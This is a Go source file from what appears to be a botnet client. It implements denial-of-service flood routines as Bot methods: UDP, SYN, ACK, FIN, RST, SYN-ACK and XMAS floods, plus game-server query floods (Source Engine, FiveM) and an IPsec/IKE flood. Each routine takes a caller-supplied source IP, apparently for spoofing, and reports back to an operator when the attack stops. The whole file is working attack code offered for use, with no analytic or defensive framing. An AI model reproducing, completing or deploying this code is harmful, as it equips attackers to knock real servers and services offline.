package lib

var (
	ReportSwitch bool
	queryPrefix  = "\xff\xff\xff\xff"
)

func convBytes(str string) []byte {
	return []byte(str)
}

func makeBuffer(size string) []byte {
	iSize := convInt(size)
	if iSize < 10 || iSize > 1450 {
		iSize = 100
	}
	return make([]byte, iSize)
}

func (b *Bot) UDP(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
	}
	d.udpPacket()
	if ReportSwitch {
		b.Report("STOP UDP FLOOD ATTACKING.")
	}
}

func (b *Bot) SYN(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		synFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP SYN FLOOD ATTACKING.")
	}
}

func (b *Bot) ACK(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		ackFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP ACK FLOOD ATTACKING.")
	}
}

func (b *Bot) FIN(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		finFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP FIN FLOOD ATTACKING.")
	}
}

func (b *Bot) RST(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		rstFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP RST FLOOD ATTACKING.")
	}
}

func (b *Bot) SAP(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		synFlag:     true,
		ackFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP SAP FLOOD ATTACKING.")
	}
}

func (b *Bot) XMAS(srcIP, dstIP, dstPort, size string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     dstPort,
		ddosPayload: makeBuffer(size),
		synFlag:     true,
		ackFlag:     true,
		rstFlag:     true,
		pshFlag:     true,
		finFlag:     true,
		urgFlag:     true,
	}
	d.tcpPacket()
	if ReportSwitch {
		b.Report("STOP XMAS FLOOD ATTACKING.")
	}
}

func (b *Bot) VSE(srcIP, dstIP string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		dstPort:     "27015",
		ddosPayload: convBytes(queryPrefix + "TSource Engine Query"),
	}
	d.udpPacket()
	if ReportSwitch {
		b.Report("STOP VSE ATTACKING.")
	}
}

func (b *Bot) FMS(srcIP, dstIP string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		ddosPayload: convBytes(queryPrefix + "getstatus"),
		dstPort:     "30120",
	}
	d.udpPacket()
	if ReportSwitch {
		b.Report("STOP FMS ATTACKING.")
	}
}

func (b *Bot) IPSEC(srcIP, dstIP string) {
	d := &DDoS{
		srcAddr:     srcIP,
		dstAddr:     dstIP,
		ddosPayload: convBytes("\x21\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01"),
		dstPort:     "500",
	}
	d.udpPacket()
	if ReportSwitch {
		b.Report("STOP IPSEC ATTACKING.")
	}
}
